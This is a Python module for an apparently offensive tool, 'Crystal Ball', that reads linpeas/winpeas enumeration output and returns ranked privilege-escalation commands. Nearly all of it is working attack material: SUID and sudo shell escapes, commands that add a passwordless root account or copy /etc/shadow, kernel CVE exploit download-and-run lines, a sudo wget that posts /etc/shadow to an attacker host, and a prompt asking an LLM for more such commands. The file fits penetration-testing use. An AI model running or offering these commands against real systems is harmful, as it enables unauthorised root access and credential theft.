"""Crystal Ball — privilege escalation vector prediction engine.

Parses system enumeration output (linpeas, winpeas, pspy) and kernel
information to generate a ranked list of specific privilege escalation
vectors with exact commands.

When an LLM backend is available the engine also analyses the target
context through the model to surface vectors that keyword-based scanners
often miss (e.g. subtle cron races, PATH-based hijacks in non-standard
locations, LXD group membership, Docker socket access, etc.).
"""

from __future__ import annotations

import os
import re
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any

BASE_DIR = Path(__file__).resolve().parent.parent
PARQUET_DIR = BASE_DIR / "parquets"
SESSIONS_DIR = BASE_DIR / "sessions"

GTFOBINS_PARQUET = PARQUET_DIR / "binarios.parquet"
LOLBAS_PARQUET = PARQUET_DIR / "lolbas_index.parquet"
MITRE_PARQUET = PARQUET_DIR / "techniques.parquet"

KNOWN_LINUX_CVES: dict[str, list[dict]] = {
    "CVE-2021-4034": {
        "name": "PwnKit (pkexec)",
        "min": "2009",
        "max": "2022",
        "description": "Local privilege escalation in polkit's pkexec",
        "exploit_url": "https://github.com/ly4k/PwnKit",
        "command": "curl -o PwnKit http://LHOST/PwnKit && chmod +x PwnKit && ./PwnKit",
        "technique": "T1068",
    },
    "CVE-2021-3156": {
        "name": "Baron Samedit (sudo)",
        "min": "1.8.2",
        "max": "1.9.5p2",
        "description": "Heap-based buffer overflow in sudo",
        "exploit_url": "https://github.com/worawit/CVE-2021-3156",
        "command": "./sudo-hax-me-a-sandwich 0",
        "technique": "T1068",
    },
    "CVE-2022-0847": {
        "name": "Dirty Pipe",
        "min": "5.8",
        "max": "5.16.11",
        "description": "Linux kernel vulnerability allowing overwriting read-only files",
        "exploit_url": "https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit",
        "command": "./dirtypipe /etc/passwd 1 /tmp/backdoor",
        "technique": "T1068",
    },
    "CVE-2023-0386": {
        "name": "OverlayFS",
        "min": "5.11",
        "max": "6.1",
        "description": "OverlayFS privilege escalation via user namespaces",
        "exploit_url": "https://github.com/sxlmnwb/CVE-2023-0386",
        "command": "./fuse ./ovlcap/lower ./ovlcap/upper ./ovlcap/work ./ovlcap/mnt",
        "technique": "T1068",
    },
    "CVE-2024-1086": {
        "name": "nftables use-after-free",
        "min": "5.14",
        "max": "6.6.15",
        "description": "Linux kernel nftables use-after-free leading to LPE",
        "exploit_url": "https://github.com/Notselwyn/CVE-2024-1086",
        "command": "./exploit",
        "technique": "T1068",
    },
    "CVE-2023-32233": {
        "name": "Netfilter UAF",
        "min": "5.15",
        "max": "6.2.9",
        "description": "Use-after-free in nf_tables",
        "exploit_url": "https://github.com/Liuk3r/CVE-2023-32233",
        "command": "./exploit",
        "technique": "T1068",
    },
    "CVE-2022-2588": {
        "name": "route4 double-free",
        "min": "2.6.12",
        "max": "5.18.15",
        "description": "Double free in cls_route route4_change",
        "exploit_url": "https://github.com/Markakd/CVE-2022-2588",
        "command": "./exploit",
        "technique": "T1068",
    },
}


@dataclass
class PrivescVector:
    """A single privilege escalation vector with ranked confidence."""

    name: str
    technique: str
    confidence: str
    description: str
    command: str
    exploit_url: str = ""
    requires_reboot: bool = False
    requires_user_interaction: bool = False
    mitre_id: str = ""
    cvss: str = ""
    cve: str = ""


@dataclass
class SystemProfile:
    """Parsed target system profile used for vector matching."""

    os_type: str = "linux"
    kernel_version: str = ""
    distro: str = ""
    arch: str = ""
    suid_binaries: list[str] = field(default_factory=list)
    capabilities: list[str] = field(default_factory=list)
    writable_paths: list[str] = field(default_factory=list)
    cron_jobs: list[str] = field(default_factory=list)
    sudo_rules: list[str] = field(default_factory=list)
    groups: list[str] = field(default_factory=list)
    services: list[str] = field(default_factory=list)
    docker_available: bool = False
    lxd_available: bool = False
    nfs_mounted: bool = False
    env_vars: dict[str, str] = field(default_factory=dict)
    raw_linpeas: str = ""
    raw_winpeas: str = ""


def _parse_kernel_version(version_str: str) -> tuple[int, ...]:
    """Parse a kernel version string into a comparable tuple.

    Args:
        version_str: Raw kernel version (e.g. '5.15.0-91-generic').

    Returns:
        Numeric tuple for comparison (e.g. (5, 15, 0, 91)).
    """
    cleaned = re.sub(r"[-_].*", "", version_str)
    parts = cleaned.split(".")
    try:
        return tuple(int(p) for p in parts)
    except (ValueError, TypeError):
        return (0,)


def _parse_version_from_range(range_str: str) -> tuple[int, ...]:
    """Parse a min/max version string to a comparable tuple.

    Args:
        range_str: Version range boundary string.

    Returns:
        Numeric tuple.
    """
    return _parse_kernel_version(range_str)


def parse_linpeas_output(text: str) -> SystemProfile:
    """Extract a structured SystemProfile from linpeas output text.

    Args:
        text: Raw linpeas.sh stdout.

    Returns:
        Populated SystemProfile instance.
    """
    profile = SystemProfile(os_type="linux", raw_linpeas=text)

    kernel_match = re.search(
        r"(?:Linux version|uname\s+-a).*?((\d+\.\d+[\d.]*)\S*)", text, re.IGNORECASE
    )
    if kernel_match:
        profile.kernel_version = kernel_match.group(2).strip(".-")

    distro_match = re.search(
        r"(?:PRETTY_NAME|Description)[:=]\s*\"?(.+?)\"?",
        text,
        re.IGNORECASE,
    )
    if distro_match:
        profile.distro = distro_match.group(1).strip()

    arch_match = re.search(r"(?:Architecture|Machine):\s*(.+)", text, re.IGNORECASE)
    if arch_match:
        profile.arch = arch_match.group(1).strip()

    profile.suid_binaries = re.findall(
        r"(?:Vulnerable to|SUID).*?(/[^\s]+)", text, re.IGNORECASE
    )
    if not profile.suid_binaries:
        profile.suid_binaries = re.findall(
            r"(?:-rws|rws).*?(/(?:usr/|bin/|sbin/|opt/)[^\s\n]+)", text
        )

    profile.capabilities = re.findall(
        r"cap_.*?(?:=|\+).*?(/[^\s]+)", text, re.IGNORECASE
    )

    profile.writable_paths = re.findall(
        r"Writable.*?(/[^\s\n]+)", text, re.IGNORECASE
    )

    profile.cron_jobs = re.findall(
        r"(?:cron|CRON).*?(/.+?)(?:\n|$)", text, re.IGNORECASE
    )

    profile.sudo_rules = re.findall(
        r"User\s+\S+\s+may\s+run.*?(/.+?)\)", text, re.IGNORECASE
    )

    for line in text.splitlines():
        if "docker" in line.lower() and ("available" in line.lower() or "socket" in line.lower()):
            profile.docker_available = True
        if "lxd" in line.lower() and ("active" in line.lower() or "group" in line.lower()):
            profile.lxd_available = True

    if "docker" in profile.groups or "lxd" in profile.groups:
        profile.docker_available = True
    if "lxd" in profile.groups:
        profile.lxd_available = True

    return profile


def parse_winpeas_output(text: str) -> SystemProfile:
    """Extract a structured SystemProfile from winpeas output text.

    Args:
        text: Raw winpeas.exe stdout.

    Returns:
        Populated SystemProfile instance.
    """
    profile = SystemProfile(os_type="windows", raw_winpeas=text)

    ver_match = re.search(r"OS\s+Version[:\s]*([\d.]+)", text, re.IGNORECASE)
    if ver_match:
        profile.kernel_version = ver_match.group(1)

    arch_match = re.search(r"(?:Architecture|System\s+Type)[:\s]*(.+)", text, re.IGNORECASE)
    if arch_match:
        profile.arch = arch_match.group(1).strip()

    profile.sudo_rules = re.findall(
        r"AlwaysInstallElevated.*?(Enabled|1)", text, re.IGNORECASE
    )

    svc_tokens = re.findall(
        r"(?:Unquoted\s+Service\s+Path|Modifiable\s+Service).*?([A-Z]:\\[^\s\n]+)",
        text,
        re.IGNORECASE,
    )
    profile.services = svc_tokens

    return profile


def match_known_cves(profile: SystemProfile) -> list[PrivescVector]:
    """Match kernel version against the built-in CVE database.

    Args:
        profile: Parsed system profile with kernel_version set.

    Returns:
        Matching privilege escalation vectors sorted by applicability.
    """
    if not profile.kernel_version:
        return []

    parsed = _parse_kernel_version(profile.kernel_version)
    if parsed == (0,):
        return []

    matches: list[PrivescVector] = []
    for cve_id, info in KNOWN_LINUX_CVES.items():
        min_ver = _parse_version_from_range(info["min"])
        max_ver = _parse_version_from_range(info["max"])
        if min_ver <= parsed <= max_ver:
            matches.append(
                PrivescVector(
                    name=info["name"],
                    technique="kernel_exploit",
                    confidence="HIGH",
                    description=info["description"],
                    command=info["command"],
                    exploit_url=info["exploit_url"],
                    mitre_id=info.get("technique", "T1068"),
                    cve=cve_id,
                )
            )

    matches.sort(key=lambda v: v.confidence == "HIGH", reverse=True)
    return matches


def suid_vectors(profile: SystemProfile) -> list[PrivescVector]:
    """Generate privilege escalation vectors from SUID binaries.

    Args:
        profile: Parsed system profile.

    Returns:
        Vectors for exploitable SUID binaries.
    """
    vectors: list[PrivescVector] = []
    gtfobins_map = _load_gtfobins_map()

    known_exploitable = {
        "find": "find . -exec /bin/sh -p \\; -quit",
        "vim": "vim -c ':py3 import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
        "nmap": 'echo "os.execute(\'/bin/sh\')" > /tmp/root.nse && nmap --script=/tmp/root.nse',
        "bash": "bash -p",
        "python": "python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh -p\")'",
        "perl": 'perl -e \'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh -p"\'',
        "ruby": "ruby -e 'Process::Sys.setuid(0); exec \"/bin/sh -p\"'",
        "php": "php -r \"posix_setuid(0); system('/bin/sh -p');\"",
        "awk": 'awk \'BEGIN {system("/bin/sh -p")}\'',
        "less": "less /etc/passwd\n!/bin/sh",
        "more": 'TERM= more /etc/passwd\n!/bin/sh',
        "man": "man man\n!/bin/sh",
        "cp": "cp /bin/sh /tmp/rooted && chmod u+s /tmp/rooted",
        "mv": "mv /bin/sh /tmp/rooted && chmod u+s /tmp/rooted",
        "tar": "tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
        "rsync": "rsync -e 'sh -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null",
        "gdb": "gdb -nx -ex 'python import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"sh <$(tty) >$(tty) 2>$(tty)\")' -ex quit",
        "systemctl": "TF=$(mktemp).service; echo '[Service]\nType=oneshot\nExecStart=/bin/sh -c \"chmod u+s /bin/bash\"\n[Install]\nWantedBy=multi-user.target' >$TF; systemctl link $TF; systemctl enable --now $TF",
        "pkexec": "pkexec /bin/sh",
        "env": "env /bin/sh -p",
        "nice": "nice /bin/sh -p",
        "timeout": "timeout 7d /bin/sh -p",
        "stdbuf": "stdbuf -i0 /bin/sh -p",
        "busybox": "busybox sh -p",
        "ash": "ash -p",
        "csh": "csh -b",
        "node": "node -e 'var exec = require(\"child_process\").exec; exec(\"chmod u+s /bin/sh\")'",
        "wget": "TF=$(mktemp); wget -O $TF http://LHOST/suid_backdoor; chmod +x $TF; $TF",
        "curl": "TF=$(mktemp); curl -o $TF http://LHOST/suid_backdoor; chmod +x $TF; $TF",
    }

    for binary_path in profile.suid_binaries:
        binary_name = os.path.basename(binary_path)
        if binary_name in known_exploitable:
            cmd = known_exploitable[binary_name].replace("LHOST", "")
            vectors.append(
                PrivescVector(
                    name=f"SUID: {binary_path}",
                    technique="suid",
                    confidence="HIGH",
                    description=f"SUID binary {binary_name} has known privilege escalation path",
                    command=cmd,
                    mitre_id="T1548.001",
                )
            )
        elif binary_name in gtfobins_map:
            entry = gtfobins_map[binary_name]
            vectors.append(
                PrivescVector(
                    name=f"SUID: {binary_path} (GTFOBins)",
                    technique="suid",
                    confidence="MEDIUM",
                    description=f"SUID binary {binary_name} listed in GTFOBins: {entry}",
                    command=f"{binary_path} # see gtfobins.github.io/gtfobins/{binary_name}",
                    mitre_id="T1548.001",
                )
            )

    return vectors


def capability_vectors(profile: SystemProfile) -> list[PrivescVector]:
    """Generate privilege escalation vectors from Linux capabilities.

    Args:
        profile: Parsed system profile with capabilities list.

    Returns:
        Vectors based on dangerous capabilities.
    """
    vectors: list[PrivescVector] = []

    cap_map = {
        "cap_sys_admin": (
            "CAP_SYS_ADMIN",
            "mount -o rw,remount / && echo 'root::0:0:root:/root:/bin/bash' >> /etc/passwd",
            "T1548",
        ),
        "cap_sys_ptrace": (
            "CAP_SYS_PTRACE",
            "python3 -c \"import ctypes; ctypes.CDLL(None).prctl(3, getppid()); open('/etc/passwd', 'a').write('root::0:0::/root:/bin/bash\\n')\"",
            "T1055",
        ),
        "cap_sys_module": (
            "CAP_SYS_MODULE",
            "echo -e '#include <linux/kmod.h>\\nvoid init(void) { call_usermodehelper(\"/bin/bash\", NULL, NULL, UMH_WAIT_PROC); }\\n__attribute__((section(\".modinfo\"))) char info[] = \"license=GPL\";' > lkm.c && make -C /lib/modules/$(uname -r)/build M=$(pwd) modules",
            "T1547.006",
        ),
        "cap_dac_read_search": (
            "CAP_DAC_READ_SEARCH",
            "tar cvf /dev/null /root /etc/shadow /home/* 2>&1 | grep -v 'Removing'",
            "T1005",
        ),
        "cap_dac_override": (
            "CAP_DAC_OVERRIDE",
            "cp /etc/shadow /tmp/shadow && chmod 644 /tmp/shadow && cat /tmp/shadow",
            "T1003.008",
        ),
        "cap_setuid": (
            "CAP_SETUID",
            "python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh -p\")'",
            "T1548.001",
        ),
        "cap_setgid": (
            "CAP_SETGID",
            "python3 -c 'import os; os.setgid(0); os.system(\"/bin/sh\")'",
            "T1548.001",
        ),
        "cap_net_admin": (
            "CAP_NET_ADMIN",
            "iptables -t nat -A OUTPUT -p tcp --dport 80 -j REDIRECT --to-port 4444  # ARP/network manipulation",
            "T1557",
        ),
        "cap_net_raw": (
            "CAP_NET_RAW",
            "tcpdump -i any -w /tmp/capture.pcap  # packet capture or ARP poisoning",
            "T1040",
        ),
        "cap_net_bind_service": (
            "CAP_NET_BIND_SERVICE",
            "python3 -c \"import socket; s=socket.socket(); s.bind(('0.0.0.0', 80)); s.listen(1)\"",
            "T1090",
        ),
        "cap_sys_rawio": (
            "CAP_SYS_RAWIO",
            "dd if=/dev/mem bs=1k skip=768 count=256 2>/dev/null | strings -n 8",
            "T1082",
        ),
        "cap_syslog": (
            "CAP_SYSLOG",
            "python3 -c \"import ctypes; libc=ctypes.CDLL(None); libc.syslog(8, b'msg', len('msg'))\"",
            "T1082",
        ),
        "cap_fowner": (
            "CAP_FOWNER",
            "chown root:root /bin/bash && chmod u+s /bin/bash && /bin/bash -p",
            "T1548",
        ),
        "cap_chown": (
            "CAP_CHOWN",
            "cp /bin/sh /tmp/.hidden && chown root:root /tmp/.hidden && chmod u+s /tmp/.hidden && /tmp/.hidden -p",
            "T1548",
        ),
    }

    for cap_entry in profile.capabilities:
        for cap_key, (cap_name, cmd, mitre) in cap_map.items():
            if cap_key in cap_entry.lower():
                vectors.append(
                    PrivescVector(
                        name=f"Capability: {cap_name}",
                        technique="capability",
                        confidence="HIGH",
                        description=f"Binary has dangerous capability {cap_name}",
                        command=cmd,
                        mitre_id=mitre,
                    )
                )
                break

    return vectors


def group_vectors(profile: SystemProfile) -> list[PrivescVector]:
    """Generate privilege escalation vectors from group memberships.

    Args:
        profile: Parsed system profile with groups list.

    Returns:
        Vectors based on special group memberships.
    """
    vectors: list[PrivescVector] = []

    if profile.docker_available or any("docker" in g.lower() for g in profile.groups):
        vectors.append(
            PrivescVector(
                name="Docker Group Membership",
                technique="group_membership",
                confidence="HIGH",
                description="User is in docker group — trivial root via container mount",
                command="docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
                mitre_id="T1548",
            )
        )

    if profile.lxd_available or any("lxd" in g.lower() for g in profile.groups):
        vectors.append(
            PrivescVector(
                name="LXD Group Membership",
                technique="group_membership",
                confidence="HIGH",
                description="User is in lxd group — root via container mount",
                command="lxc init ubuntu: privesc -c security.privileged=true && lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true && lxc start privesc && lxc exec privesc -- /bin/sh",
                mitre_id="T1548",
            )
        )

    return vectors


def sudo_vectors(profile: SystemProfile) -> list[PrivescVector]:
    """Generate privilege escalation vectors from sudo rules.

    Args:
        profile: Parsed system profile with sudo rules.

    Returns:
        Vectors for exploitable sudo configurations.
    """
    vectors: list[PrivescVector] = []

    dangerous_sudo_bins = {
        "vim": "sudo vim -c ':!/bin/sh'",
        "vi": "sudo vi -c ':!/bin/sh'",
        "less": "sudo less /etc/passwd\n!/bin/sh",
        "more": "sudo TERM= more /etc/passwd\n!/bin/sh",
        "man": "sudo man man\n!/bin/sh",
        "find": "sudo find /etc/passwd -exec /bin/sh \\;",
        "nmap": "echo \"os.execute('/bin/sh')\" > /tmp/sudo.nse && sudo nmap --script=/tmp/sudo.nse",
        "awk": "sudo awk 'BEGIN {system(\"/bin/sh\")}'",
        "nano": "sudo nano\n^R^X\nreset; sh 1>&0 2>&0",
        "cp": "sudo cp /bin/sh /bin/rooted && sudo chmod u+s /bin/rooted && /bin/rooted -p",
        "systemctl": "sudo systemctl\n!/bin/sh",
        "journalctl": "sudo journalctl\n!/bin/sh",
        "git": "sudo PAGER='sh -c \"exec sh 0<&1\"' git -p help",
        "ftp": "sudo ftp\n!/bin/sh",
        "gdb": "sudo gdb -nx -ex 'python import os; os.execl(\"/bin/sh\", \"sh\")' -ex quit",
        "node": "sudo node -e 'var exec = require(\"child_process\").exec; exec(\"chmod u+s /bin/sh\")'",
        "pip": "TF=$(mktemp -d); echo 'import os; os.execl(\"/bin/sh\", \"sh\")' > $TF/setup.py; sudo pip install $TF",
        "apt-get": "sudo apt-get changelog apt\n!/bin/sh",
        "dpkg": 'sudo dpkg -l\n!/bin/sh',
        "apk": "sudo apk add --allow-untrusted -X https://attacker.com/evil evil.apk",
        "su": "sudo su -",
        "bash": "sudo bash",
        "zsh": "sudo zsh",
        "mysql": 'sudo mysql -e "\\! /bin/sh"',
        "psql": "sudo psql\n\\!/bin/sh",
        "tcpdump": "echo 'cat /etc/shadow' > /tmp/.privesc; chmod +x /tmp/.privesc; sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z /tmp/.privesc -Z root",
        "wget": "sudo wget --post-file=/etc/shadow http://LHOST/",
        "rsync": "sudo rsync -e 'sh -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null",
        "crontab": "echo '* * * * * chmod u+s /bin/bash' | sudo crontab -",
        "mount": "sudo mount -o bind /bin/sh /bin/mount && /bin/mount -p",
        "pkexec": "sudo pkexec /bin/sh",
        "socat": "sudo socat stdin exec:sh,pty,stderr,setsid,sigint,sane",
        "expect": "sudo expect -c 'spawn /bin/sh; interact'",
        "scp": "sudo scp -S /path/to/malicious.sh x y:",
    }

    for rule in profile.sudo_rules:
        for bin_name, cmd in dangerous_sudo_bins.items():
            if bin_name in rule.lower() and f"/{bin_name}" in rule:
                vectors.append(
                    PrivescVector(
                        name=f"Sudo: {bin_name}",
                        technique="sudo",
                        confidence="HIGH",
                        description=f"User can run {bin_name} as root via sudo — GTFOBins bypass available",
                        command=cmd.replace("LHOST", ""),
                        mitre_id="T1548.003",
                    )
                )

    if "NOPASSWD" in " ".join(profile.sudo_rules):
        vectors.append(
            PrivescVector(
                name="Sudo: NOPASSWD rule found",
                technique="sudo",
                confidence="MEDIUM",
                description="NOPASSWD sudo rule detected — check for exploitable binaries",
                command="sudo -l # list allowed commands",
                mitre_id="T1548.003",
            )
        )

    return vectors


def cron_vectors(profile: SystemProfile) -> list[PrivescVector]:
    """Generate vectors from writable cron jobs and PATH manipulation.

    Args:
        profile: Parsed system profile.

    Returns:
        Vectors based on cron misconfigurations.
    """
    vectors: list[PrivescVector] = []

    if profile.writable_paths:
        vectors.append(
            PrivescVector(
                name="Writable PATH hijack via cron",
                technique="cron",
                confidence="MEDIUM",
                description="Writable directory found in PATH — plant a trojan with the same name as a cron-ed binary",
                command=f"# Check: grep -r defunct_bin_name /etc/cron* 2>/dev/null\ncp /bin/bash {profile.writable_paths[0]}/<cron_binary_name> && chmod u+s {profile.writable_paths[0]}/<cron_binary_name>",
                mitre_id="T1053.003",
            )
        )

    if profile.cron_jobs:
        for job in profile.cron_jobs[:3]:
            vectors.append(
                PrivescVector(
                    name=f"Cron job: {os.path.basename(job)[:40]}",
                    technique="cron",
                    confidence="LOW",
                    description=f"Inspect cron job for writable scripts or wildcard injection: {job}",
                    command=f"ls -la {job}  # check if writable\ngrep -r 'tar\\|zip\\|chown' /etc/cron* 2>/dev/null  # wildcard injection",
                    mitre_id="T1053.003",
                )
            )

    return vectors


def _load_gtfobins_map() -> dict[str, str]:
    """Load GTFOBins entries from the parquet knowledge base.

    Returns:
        Mapping of binary name to description.
    """
    mapping: dict[str, str] = {}

    try:
        import pandas as pd
    except ImportError:
        return mapping

    parquet_paths = [
        GTFOBINS_PARQUET,
        PARQUET_DIR / "binarios.parquet",
        PARQUET_DIR / "binarios.parquet.gzip",
    ]

    for pq_path in parquet_paths:
        if pq_path.exists():
            try:
                df = pd.read_parquet(pq_path)
                name_col = next(
                    (c for c in df.columns if c.lower() in ("binary", "name", "nombre", "binario")), None
                )
                desc_col = next(
                    (c for c in df.columns if c.lower() in ("description", "info", "category")), None
                )
                if name_col:
                    for _, row in df.iterrows():
                        name = str(row[name_col]).strip()
                        desc = str(row.get(desc_col, "")).strip() if desc_col else ""
                        if name:
                            mapping[name] = desc
                break
            except Exception:
                continue

    return mapping


def _try_llm_analysis(profile: SystemProfile) -> list[PrivescVector]:
    """Use the configured LLM backend to suggest additional privesc vectors.

    Args:
        profile: Parsed system profile.

    Returns:
        LLM-suggested vectors, or empty list if no backend is available.
    """
    vectors: list[PrivescVector] = []

    try:
        from modules.llm_factory import get_llm_backend
    except ImportError:
        return vectors

    try:
        backend = get_llm_backend()
    except Exception:
        return vectors

    prompt = f"""You are a privilege escalation expert doing a security audit.
Analyze the following system profile and suggest specific, actionable privesc vectors.

Each suggestion MUST include:
- The exact command(s) to execute
- The CVE number if applicable
- The confidence level (HIGH/MEDIUM/LOW)
- A one-line description

System type: {profile.os_type}
Kernel version: {profile.kernel_version}
Distro: {profile.distro}
Architecture: {profile.arch}
Groups: {', '.join(profile.groups) if profile.groups else 'unknown'}
Docker available: {profile.docker_available}
LXD available: {profile.lxd_available}
SUID binaries (sample): {', '.join(profile.suid_binaries[:10]) if profile.suid_binaries else 'none found'}
Capabilities (sample): {', '.join(profile.capabilities[:5]) if profile.capabilities else 'none found'}
Sudo rules (sample): {', '.join(profile.sudo_rules[:5]) if profile.sudo_rules else 'none detected'}
Writable paths: {', '.join(profile.writable_paths[:5]) if profile.writable_paths else 'none found'}
Services (Windows): {', '.join(profile.services[:5]) if profile.services else 'N/A'}

Output format — one vector per line:
NAME | TECHNIQUE | CONFIDENCE | DESCRIPTION | COMMAND | CVE (optional)

Only output vectors. No preamble. No markdown. Max 5 vectors.
Focus on less obvious vectors (capabilities, cron races, shared object injection, PATH hijacking, service binary hijacking).
"""

    try:
        response = backend.complete(prompt)
        if not response:
            return vectors

        for line in response.splitlines():
            line = line.strip()
            if not line or "|" not in line:
                continue
            parts = line.split("|", 5)
            if len(parts) >= 5:
                name = parts[0].strip()
                technique = parts[1].strip() if len(parts) > 1 else "unknown"
                confidence = parts[2].strip().upper() if len(parts) > 2 else "MEDIUM"
                description = parts[3].strip() if len(parts) > 3 else ""
                command = parts[4].strip() if len(parts) > 4 else ""
                cve = parts[5].strip() if len(parts) > 5 else ""

                if name and command:
                    confidence = confidence if confidence in ("HIGH", "MEDIUM", "LOW") else "MEDIUM"
                    vectors.append(
                        PrivescVector(
                            name=f"[AI] {name}",
                            technique=technique,
                            confidence=confidence,
                            description=description,
                            command=command,
                            cve=cve,
                            mitre_id="T1068",
                        )
                    )
    except Exception:
        pass

    return vectors


def analyze_privesc(filepath: str | None = None, text: str | None = None) -> dict[str, Any]:
    """Main entry point — analyse a system for privilege escalation vectors.

    Args:
        filepath: Path to linpeas/winpeas output file.
        text: Raw enumeration output text (alternative to filepath).

    Returns:
        Dict with system_profile and ranked vectors.
    """
    if filepath and os.path.isfile(filepath):
        with open(filepath) as f:
            text = f.read()

    if not text:
        return {"error": "No enumeration data provided", "vectors": [], "system_profile": None}

    if "winPEAS" in text or "Windows" in text[:500]:
        raw = text
        profile = parse_winpeas_output(raw)
    else:
        raw = text
        profile = parse_linpeas_output(raw)
        profile.groups = re.findall(r"groups:(.*)", raw, re.IGNORECASE)

    all_vectors: list[PrivescVector] = []
    all_vectors.extend(match_known_cves(profile))
    all_vectors.extend(suid_vectors(profile))
    all_vectors.extend(capability_vectors(profile))
    all_vectors.extend(sudo_vectors(profile))
    all_vectors.extend(group_vectors(profile))
    all_vectors.extend(cron_vectors(profile))

    try:
        llm_vectors = _try_llm_analysis(profile)
        all_vectors.extend(llm_vectors)
    except Exception:
        pass

    unique: list[PrivescVector] = []
    seen_names: set[str] = set()
    for v in all_vectors:
        if v.name not in seen_names:
            seen_names.add(v.name)
            unique.append(v)

    high = [v for v in unique if v.confidence == "HIGH"]
    med = [v for v in unique if v.confidence == "MEDIUM"]
    low = [v for v in unique if v.confidence == "LOW"]
    sorted_vectors = high + med + low

    return {
        "vectors": [
            {
                "name": v.name,
                "technique": v.technique,
                "confidence": v.confidence,
                "description": v.description,
                "command": v.command,
                "exploit_url": v.exploit_url,
                "mitre_id": v.mitre_id,
                "cve": v.cve,
            }
            for v in sorted_vectors
        ],
        "system_profile": {
            "os_type": profile.os_type,
            "kernel_version": profile.kernel_version,
            "distro": profile.distro,
            "arch": profile.arch,
            "docker_available": profile.docker_available,
            "lxd_available": profile.lxd_available,
            "groups": profile.groups,
            "suid_count": len(profile.suid_binaries),
            "capability_count": len(profile.capabilities),
            "writable_path_count": len(profile.writable_paths),
            "sudo_rule_count": len(profile.sudo_rules),
        },
        "total_vectors": len(sorted_vectors),
        "high_confidence": len(high),
        "medium_confidence": len(med),
        "low_confidence": len(low),
    }


def format_crystal_ball_output(result: dict[str, Any]) -> str:
    """Format the analysis result as a human-readable terminal report.

    Args:
        result: Output from :func:`analyze_privesc`.

    Returns:
        Formatted multi-line string with ANSI colours.
    """
    from core.console import (
        BOLD,
        BRIGHT_CYAN,
        BRIGHT_GREEN,
        BRIGHT_RED,
        BRIGHT_YELLOW,
        CYAN,
        GREEN,
        MAGENTA,
        RED,
        RESET,
        WHITE,
        YELLOW,
    )

    if result.get("error"):
        return f"{RED}[-] {result['error']}{RESET}"

    lines: list[str] = []
    profile = result.get("system_profile", {})
    vectors = result.get("vectors", [])

    lines.append("")
    lines.append(f"{BOLD}{BRIGHT_CYAN}   Crystal Ball  Privesc Vector Prediction{RESET}")
    lines.append(f"{CYAN}   {'=' * 72}{RESET}")
    lines.append("")

    if profile:
        lines.append(f"   {WHITE}Target Profile:{RESET}")
        lines.append(f"     OS:        {profile.get('os_type', '?').upper()} ({profile.get('distro', 'unknown')})")
        lines.append(f"     Kernel:    {profile.get('kernel_version', 'unknown')}")
        lines.append(f"     Arch:      {profile.get('arch', 'unknown')}")
        lines.append(f"     Docker:    {'yes' if profile.get('docker_available') else 'no'}")
        lines.append(f"     SUID bins: {profile.get('suid_count', 0)}  |  Caps: {profile.get('capability_count', 0)}")
        lines.append(f"     Groups:    {', '.join(profile.get('groups', [])) if profile.get('groups') else 'unknown'}")
        lines.append("")

    lines.append(f"   {WHITE}Results: {result.get('total_vectors', 0)} vectors found")
    lines.append(f"     {BRIGHT_RED}HIGH:   {result.get('high_confidence', 0)}")
    lines.append(f"     {BRIGHT_YELLOW}MEDIUM: {result.get('medium_confidence', 0)}")
    lines.append(f"     {GREEN}LOW:    {result.get('low_confidence', 0)}")
    lines.append("")

    if not vectors:
        lines.append(f"   {YELLOW}No privesc vectors found from the provided data.{RESET}")
        lines.append(f"   {WHITE}Try running linpeas or winpeas first, then re-analyse.{RESET}")
        return "\n".join(lines)

    conf_colors = {"HIGH": BRIGHT_RED, "MEDIUM": BRIGHT_YELLOW, "LOW": GREEN}

    for i, v in enumerate(vectors, 1):
        color = conf_colors.get(v.get("confidence", "LOW"), GREEN)
        lines.append(f"   {BOLD}{i}. {v['name']}{RESET}")
        lines.append(f"      {MAGENTA}Confidence:{RESET} {color}{v['confidence']}{RESET}  {MAGENTA}Technique:{RESET} {v['technique']}")
        if v.get("cve"):
            lines.append(f"      {MAGENTA}CVE:{RESET}       {BRIGHT_CYAN}{v['cve']}{RESET}")
        if v.get("mitre_id"):
            lines.append(f"      {MAGENTA}MITRE:{RESET}     {v['mitre_id']}")
        lines.append(f"      {MAGENTA}Info:{RESET}      {v['description']}")
        lines.append(f"      {BRIGHT_GREEN}{v['command']}{RESET}")
        if v.get("exploit_url"):
            lines.append(f"      {MAGENTA}Exploit:{RESET}   {v['exploit_url']}")
        lines.append("")

    lines.append(f"   {WHITE}Total: {len(vectors)} vectors. HIGH > MEDIUM > LOW order.{RESET}")
    lines.append("")

    return "\n".join(lines)


def main():
    """CLI entry point for crystal ball privesc analysis."""
    import sys

    if len(sys.argv) < 2:
        print("Usage: python -m modules.privesc_predictor <linpeas_output_file>")
        sys.exit(1)
    result = analyze_privesc(filepath=sys.argv[1])
    print(format_crystal_ball_output(result))


if __name__ == "__main__":
    main()


__all__ = [
    "PrivescVector",
    "SystemProfile",
    "analyze_privesc",
    "format_crystal_ball_output",
    "match_known_cves",
    "suid_vectors",
    "capability_vectors",
    "sudo_vectors",
    "group_vectors",
    "cron_vectors",
    "parse_linpeas_output",
    "parse_winpeas_output",
]
